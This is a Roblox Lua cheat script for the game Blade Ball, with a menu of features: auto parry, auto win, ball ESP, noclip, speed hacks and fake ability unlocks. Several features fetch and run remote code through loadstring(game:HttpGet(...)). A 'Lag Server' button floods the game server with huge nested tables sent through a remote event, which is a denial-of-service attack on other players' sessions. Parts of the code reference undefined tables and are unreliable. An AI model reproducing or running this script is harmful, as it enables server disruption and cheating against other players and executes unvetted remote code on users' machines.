local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

local X = Material.Load({
	Title = "Blade Ball | Legend HandlesYT",
	Style = 1,
	SizeX = 500,
	SizeY = 400,
	Theme = "Light",
	ColorOverrides = {
		MainFrame = Color3.fromRGB(177, 229, 166),
        Button = Color3.fromRGB(40, 127, 71),
        Toggle = Color3.fromRGB(40, 127, 71),
        TextField = Color3.fromRGB(40, 127, 71),
		TextFieldAccent = Color3.fromRGB(40, 127, 71),
        TitleBar = Color3.fromRGB(40, 127, 71),
        NavBarAccent   = Color3.fromRGB(242, 243, 243),
    NavBar = Color3.fromRGB(40, 127, 71),
    Slider = Color3.fromRGB(40, 127, 71),
		SliderAccent = Color3.fromRGB(242, 243, 243),
	}
})


local workspace = game:GetService("Workspace")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = game.Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local abilitiesFolder = character:WaitForChild("Abilities")
local upgrades = localPlayer.Upgrades

local function onCharacterAdded(newCharacter)
    character = newCharacter
    abilitiesFolder = character:WaitForChild("Abilities")
end

localPlayer.CharacterAdded:Connect(onCharacterAdded)

local TruValue = Instance.new("StringValue")
if workspace:FindFirstChild("AbilityThingyk1212") then
    workspace:FindFirstChild("AbilityThingyk1212"):Remove()
    task.wait(0.1)
    TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Dash" --Change to Use other ability
    else
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Dash" --Change to Use other ability
end

	
	
local main = X.New({Title = "Main-Features"})



main.Toggle({
	Text = "AI Auto Play (USE WITH AUTO PARRY)",
		Callback = function(Value)
	
     a = Value
        while a do task.wait(1.5)
        pcall(function()
        
 spawn(function()
  for _,ball in next, workspace.Balls:GetChildren() do
            if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, ball.Position)
               
                end
            end 
            
            end)
            
            spawn(function()
   local vim = game:GetService("VirtualInputManager")
local waitTime = .5


vim:SendKeyEvent(true, "W", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "W", false, game)

vim:SendKeyEvent(true, "W", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "W", false, game)
vim:SendKeyEvent(true, "W", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "W", false, game)

vim:SendKeyEvent(true, "W", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "W", false, game)

vim:SendKeyEvent(true, "D", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "D", false, game)

vim:SendKeyEvent(true, "D", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "D", false, game)
vim:SendKeyEvent(true, "D", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "D", false, game)
vim:SendKeyEvent(true, "D", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "D", false, game)

vim:SendKeyEvent(true, "D", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "D", false, game)

vim:SendKeyEvent(true, "A", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "A", false, game)

vim:SendKeyEvent(true, "A", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "A", false, game)


vim:SendKeyEvent(true, "S", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "S", false, game)

end)
   end)
   end
      
	end,
	Enabled = false
})


main.Toggle({
	Text = "AI Auto Jump",
		Callback = function(Value)
		 a = Value
        while a do task.wait(1)
        pcall(function()
        
		local vim = game:GetService("VirtualInputManager")
local waitTime = .5

vim:SendKeyEvent(true, "Space", false, game)
wait(waitTime)
vim:SendKeyEvent(false, "Space", false, game)
end)
end
		end,
	Enabled = false
})	
		


main.Toggle({
	Text = "Auto Open Halloween Crate",
		Callback = function(Value)
		     a = Value
        while a do task.wait(.1)
        pcall(function()
game:GetService("ReplicatedStorage").Remotes.Store.RequestHalloweenSwordCrate:InvokeServer()

        end)
             end
	end,
	Enabled = false
})



main.Toggle({
    Text = "Dodge Ball",
    Enabled = false,
    Callback = function(Value)
      a = Value
        while a do task.wait()
        pcall(function()
        for i,v in pairs(workspace.Balls:GetChildren()) do
                    if v:IsA("Part") then 
                   
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0,Settings.Height,Settings.Distance)
    end
    end
     end)
     end
	end,
	Enabled = false
})

main.Slider({
    Text = "Dodge Ball Distance",
    Callback = function(v)
        Settings["Distance"] = v
    end,
    Min = -20,
    Max = 100,
    Def = 17
})


main.Slider({
    Text = "Dodge Ball Height",
    Callback = function(v)
        Settings["Height"] = v
    end,
    Min = -20,
    Max = 100,
    Def = 17
})
main.Button({
	Text = "Auto Parry",
		Callback = function()
		getgenv().ScriptConfig = {
    -- Distance in stud before the automatic triggers,
    -- you may change even after you have ran the script if you desire!
    -- Just be sure to REMOVE the loadstring, or else you will face some... issues
	DistanceBeforeParry = 46,
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sussy-Tech/Scripts/main/BladeBall.lua"))()
		end})

main.Slider({
    Text = "Auto Parry Distance",
    Callback = function(s)
     getgenv().ScriptConfig = {
    -- Distance in stud before the automatic triggers,
    -- you may change even after you have ran the script if you desire!
    -- Just be sure to REMOVE the loadstring, or else you will face some... issues
	DistanceBeforeParry = (s),
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Sussy-Tech/Scripts/main/BladeBall.lua"))()
    end,
    Min = 10,
    Max = 100,
    Def = 46
})


main.Toggle({
	Text = "Auto Win",
		Callback = function(state)
	if state then
	getgenv().god = true
while getgenv().god and task.wait() do
    for _,ball in next, workspace.Balls:GetChildren() do
        if ball then
            if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, ball.Position)
                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Highlight") then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = ball.CFrame * CFrame.new(0, 0, (ball.Velocity).Magnitude * -0.5)
                    game:GetService("ReplicatedStorage").Remotes.ParryButtonPress:Fire()
                end
            end
        end
    end
end
	else
	getgenv().god = false
while getgenv().god and task.wait() do
    for _,ball in next, workspace.Balls:GetChildren() do
        if ball then
            if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, ball.Position)
                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Highlight") then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = ball.CFrame * CFrame.new(0, 0, (ball.Velocity).Magnitude * -0.5)
                    game:GetService("ReplicatedStorage").Remotes.ParryButtonPress:Fire()
                end
            end
        end
    end
end
	end
      
	end,
	Enabled = false
})


main.Button({
	Text = "Auto Clicker (Press G, On/Off)",
			Callback = function()
	   
local Toggle = false
game:GetService"UserInputService".InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.G then Toggle = not Toggle end
end)
while task.wait() do
    if Toggle then
  local cps = 50 -- Clicks per second here

     mouse1click()
     wait(1/cps)

    end
end
	end
	})
	
	
	main.Button({
	Text = "(L) Lag Server",
		Callback = function()
		    getgenv().Toggled=false
getgenv().KeyBind="L"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
		    
		    end})


main.Toggle({
    Text = "Auto Ability",
    Enabled = false,
    Callback = function(Value)
      a = Value
        while a do task.wait(.2)
        pcall(function()
          keypress(0x51)
wait(0.323)
keyrelease(0x51)
        end)
        end
    end
})


main.Button({
	Text = "Teleport To Pro Servers",
		Callback = function()
	   
	end
})

main.Toggle({
	Text = "Ball ESP",
		Callback = function(Value)
		     a = Value
        while a do task.wait(.1)
        pcall(function()
	
	for __,v in pairs(game.workspace.Balls:GetChildren()) do -- the path
 if v:IsA("Part") then -- the item
   local a = Instance.new("BillboardGui",v) -- pretty much explains everything
   a.Name = "Ball1"
   a.Size = UDim2.new(10,0, 10,0)
   a.AlwaysOnTop = true
   local b = Instance.new("Frame",a)
   b.Size = UDim2.new(1,0, 1,0)
   b.BackgroundTransparency = 1
   b.BorderSizePixel = 0
   
   local c = Instance.new('TextLabel',b)
   c.TextColor3 = Color3.new(255, 255, 0)
   c.Size = UDim2.new(2,0,2,0)
   c.BorderSizePixel = 0
   c.TextSize = 15
   c.Text = "Ball"
   c.BackgroundTransparency = 1
 end
end
		end)
		end
	end,
	Enabled = false
})



main.Button({
	Text = "Unlock Oni Claws",
		Callback = function()

            
    local localplayer = game.Players.LocalPlayer
local character = localplayer.Character
local sword = character:FindFirstChildOfClass("Model")
local claws = game:GetService("ReplicatedStorage").Misc.Swords.Limited["Oni Claws"]:Clone()
local Katanamesh = character:FindFirstChildOfClass("Model"):FindFirstChild("KatanaMesh")
local Cestsu1 = claws.Cestus
local Cestsu2 = claws.Cestus2

local Glove = claws
local Cestus1 = Glove:FindFirstChild("Cestus")
local Cestus1Blade = Cestus1:FindFirstChild("Meshes/oni claws textured_Cube.010_Cube.020")
local thing = Cestus1Blade
local Cestus2 = Glove:FindFirstChild("Cestus2")

Glove.Parent = sword
local leftarm = Instance.new("Weld")
leftarm.Name = "Left Arm"
leftarm.Parent = Cestus1
leftarm.Part0 = Cestus1.zaza
leftarm.Part1 = character:FindFirstChild("Left Arm")

local leftarm = Instance.new("Weld")
leftarm.Name = "Right Arm"
leftarm.Parent = Cestus2
leftarm.Part0 = Cestus2.zaza
leftarm.Part1 = character:FindFirstChild("Right Arm")
local katmesh = Katanamesh
katmesh.Transparency = 1


    character:FindFirstChildOfClass("Model").sord:Remove()
    character:FindFirstChildOfClass("Model").handle:Remove()
    character:FindFirstChildOfClass("Model"):FindFirstChild("WhiteFlameCharges"):Remove()
    character:FindFirstChildOfClass("Model"):FindFirstChild("Excalibur"):Remove()
end
	
})


main.Button({
	Text = "Gamepass Effect + Music",
		Callback = function()
	      local args = {[1] = true,[2] = "Empyrean"}game:GetService("ReplicatedStorage").Remotes.CustomEmote:FireServer(unpack(args))
	end
})

local main11 = X.New({Title = "Main2"})


	main11.Button({
	Text = "Less Ping",
		Callback = function()
		       for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end
		    end})
		    

main11.Toggle({
	Text = "Auto Vote Classic",
		Callback = function(Value)
		     a = Value
        while a do task.wait(1)
        pcall(function()

local args = {
    [1] = "ffa"
}

game:GetService("ReplicatedStorage").Remotes.UpdateVotes:FireServer(unpack(args))

end)
             end
	end,
	Enabled = false
})


main11.Toggle({
	Text = "Auto Vote 2 Teams",
		Callback = function(Value)
		     a = Value
        while a do task.wait(1)
        pcall(function()

local args = {
    [1] = "2t"
}

game:GetService("ReplicatedStorage").Remotes.UpdateVotes:FireServer(unpack(args))

end)
             end
	end,
	Enabled = false
})


main11.Toggle({
	Text = "Auto Vote 4 Teams",
		Callback = function(Value)
		     a = Value
        while a do task.wait(1)
        pcall(function()

local args = {
    [1] = "4t"
}

game:GetService("ReplicatedStorage").Remotes.UpdateVotes:FireServer(unpack(args))

end)
             end
	end,
	Enabled = false
})


		    
main11.Toggle({
	Text = "Auto Spin Wheel",
		Callback = function(Value)
		     a = Value
        while a do task.wait(.1)
        pcall(function()
game:GetService("ReplicatedStorage").Remotes.useSpin:InvokeServer()
end)
             end
	end,
	Enabled = false
})

main11.Toggle({
	Text = "Auto Open Sword Box",
		Callback = function(Value)
		     a = Value
        while a do task.wait(.1)
        pcall(function()
game:GetService("ReplicatedStorage").Remotes.Store.RequestOpenSwordBox:InvokeServer()

        end)
             end
	end,
	Enabled = false
})


main11.Toggle({
	Text = "Auto Open Explosion Box",
		Callback = function(Value)
		     a = Value
        while a do task.wait(.1)
        pcall(function()
game:GetService("ReplicatedStorage").Remotes.Store.RequestOpenExplosionBox:InvokeServer()
        end)
             end
	end,
	Enabled = false
})



local e = X.New({
    Title = "Inf/Unlock-Skills"
})


e.Button({
	Text = "Unlock Freeze Skill",
		Callback = function()
	local function AbilityValue2()
local TruValue = Instance.new("StringValue")
workspace:FindFirstChild("AbilityThingyk1212"):Remove()
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Freeze" --Change to Use other ability
end

for i,v in pairs(abilitiesFolder:GetChildren()) do


for i,b in pairs(abilitiesFolder:GetChildren()) do
    local Ability = b
    
    if v.Enabled == true then
        local EquippedAbility = v
        local ChosenAbility = {}
        spawn(function()
        ChosenAbility = AbilityValue2()
    end)

    task.wait(0.05)
        local AbilityValue = workspace.AbilityThingyk1212
        if b.Name == AbilityValue.Value then

            v.Enabled = false
            b.Enabled = true
    end
end
end
end
	end
})


e.Button({
	Text = "Equip Dash",
		Callback = function()
local function AbilityValue2()
local TruValue = Instance.new("StringValue")
workspace:FindFirstChild("AbilityThingyk1212"):Remove()
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Dash" --Change to Use other ability
end

for i,v in pairs(abilitiesFolder:GetChildren()) do


for i,b in pairs(abilitiesFolder:GetChildren()) do
    local Ability = b
    
    if v.Enabled == true then
        local EquippedAbility = v
        local ChosenAbility = {}
        spawn(function()
        ChosenAbility = AbilityValue2()
    end)

    task.wait(0.05)
        local AbilityValue = workspace.AbilityThingyk1212
        if b.Name == AbilityValue.Value then

            v.Enabled = false
            b.Enabled = true
    end
end
end
end
	end
})

e.Button({
	Text = "Infinite Dash (Equip Dash)",
		Callback = function()
		     upgrades:WaitForChild("Dash").Value = 999999999999999999
	end
})


e.Button({
	Text = "Infinite Shadow Step (Equip Shadow Step)",
		Callback = function()
upgrades:WaitForChild("Shadow Step").Value = 999999999999999999
	end
})

e.Button({
	Text = "Infinite Thunder Dash (Equip Thunder Dash)",
		Callback = function()
upgrades:WaitForChild("Thunder Dash").Value = 999999999999999999
	end
})

e.Button({
	Text = "Infinite Super Jump (Equip Super Jump)",
		Callback = function()
upgrades:WaitForChild("Super Jump").Value = 999999999999999999
	end
})



e.Button({
	Text = "Unlock Super Jump",
		Callback = function()
	   local function AbilityValue2()
local TruValue = Instance.new("StringValue")
workspace:FindFirstChild("AbilityThingyk1212"):Remove()
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Super Jump" --Change to Use other ability
end

for i,v in pairs(abilitiesFolder:GetChildren()) do


for i,b in pairs(abilitiesFolder:GetChildren()) do
    local Ability = b
    
    if v.Enabled == true then
        local EquippedAbility = v
        local ChosenAbility = {}
        spawn(function()
        ChosenAbility = AbilityValue2()
    end)

    task.wait(0.05)
        local AbilityValue = workspace.AbilityThingyk1212
        if b.Name == AbilityValue.Value then

            v.Enabled = false
            b.Enabled = true
    end
end
end
end
	end
})
e.Button({
	Text = "Unlock Raging Deflection Skill",
		Callback = function()
	   local function AbilityValue2()
local TruValue = Instance.new("StringValue")
workspace:FindFirstChild("AbilityThingyk1212"):Remove()
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Raging Deflection" --Change to Use other ability
end

for i,v in pairs(abilitiesFolder:GetChildren()) do


for i,b in pairs(abilitiesFolder:GetChildren()) do
    local Ability = b
    
    if v.Enabled == true then
        local EquippedAbility = v
        local ChosenAbility = {}
        spawn(function()
        ChosenAbility = AbilityValue2()
    end)

    task.wait(0.05)
        local AbilityValue = workspace.AbilityThingyk1212
        if b.Name == AbilityValue.Value then

            v.Enabled = false
            b.Enabled = true
    end
end
end
end
	end
})

e.Button({
	Text = "Unlock Shadow Step Skill",
		Callback = function()
	local function AbilityValue2()
local TruValue = Instance.new("StringValue")
workspace:FindFirstChild("AbilityThingyk1212"):Remove()
        TruValue.Parent = game:GetService("Workspace")
        TruValue.Name = "AbilityThingyk1212"
        TruValue.Value = "Shadow Step" --Change to Use other ability
end

for i,v in pairs(abilitiesFolder:GetChildren()) do


for i,b in pairs(abilitiesFolder:GetChildren()) do
    local Ability = b
    
    if v.Enabled == true then
        local EquippedAbility = v
        local ChosenAbility = {}
        spawn(function()
        ChosenAbility = AbilityValue2()
    end)

    task.wait(0.05)
        local AbilityValue = workspace.AbilityThingyk1212
        if b.Name == AbilityValue.Value then

            v.Enabled = false
            b.Enabled = true
    end
end
end
end
	end
})






local main1 = X.New({Title = "Misc-Features"})


main1.Slider({
	Text = "Walkspeed",
	Callback = function(s)

   getgenv().WalkSpeedValue = (s); --set your desired walkspeed here

local Player = game:service'Players'.LocalPlayer;

Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()

Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;

end)


Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
end,
	Min = 16,
	Max = 150,
	Def = 16
})
 main1.Toggle({
	Text = "Infinite Jump",
	Callback = function(state)
 if state then
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
    else
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
            
	end,
	Enabled = false
})
	main1.Button({
	Text = "CFrame Speed (Z)",
		Callback = function()
        repeat
		wait()
	until game:IsLoaded()
	local L_134_ = game:service('Players')
	local L_135_ = L_134_.LocalPlayer
	repeat
		wait()
	until L_135_.Character
	local L_136_ = game:service('UserInputService')
	local L_137_ = game:service('RunService')
	getgenv().Multiplier = 0.5
	local L_138_ = true
	local L_139_
	L_136_.InputBegan:connect(function(L_140_arg0)
		if L_140_arg0.KeyCode == Enum.KeyCode.LeftBracket then
			Multiplier = Multiplier + 0.01
			print(Multiplier)
			wait(0.2)
			while L_136_:IsKeyDown(Enum.KeyCode.LeftBracket) do
				wait()
				Multiplier = Multiplier + 0.01
				print(Multiplier)
			end
		end
		if L_140_arg0.KeyCode == Enum.KeyCode.RightBracket then
			Multiplier = Multiplier - 0.01
			print(Multiplier)
			wait(0.2)
			while L_136_:IsKeyDown(Enum.KeyCode.RightBracket) do
				wait()
				Multiplier = Multiplier - 0.01
				print(Multiplier)
			end
		end
		if L_140_arg0.KeyCode == Enum.KeyCode.Z then
			L_138_ = not L_138_
			if L_138_ == true then
				repeat
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
					game:GetService("RunService").Stepped:wait()
				until L_138_ == false
			end
		end
	end)
        end})
main1.Slider({
	Text = "CFrame Speed",
	Callback = function(s)
 
 getgenv().Multiplier = s
	end,
	Min = 0,
	Max = 5,
	Def = 0
})



	main1.Button({
	Text = "Free Camera",
		Callback = function()
local LocalPlayer = game:GetService("Players").LocalPlayer
		LocalPlayer.CameraMaxZoomDistance = 9e9
		LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
end})


main1.Button({
	Text = "Noclip",
		Callback = function()
local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip() -- to toggle noclip() and clip()
end})



		    

main1.Toggle({
	Text = "Free Camera",
		Callback = function(Value)
  local LocalPlayer = game:GetService("Players").LocalPlayer
		LocalPlayer.CameraMaxZoomDistance = 9e9
		LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
	end,
	Enabled = false
})



main1.Button({
	Text = "Reset",
		Callback = function()
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
end})




-- // Credits \\ --
local cred = UI.New({
    Title = "Credits"
})

local creators = {
    "YT: Legend Handles",
}

for i,v in pairs(creators) do 
    cred.Button({
        Text = v,
        Callback = function()
            setclipboard(v) 
        end;
    });
end;

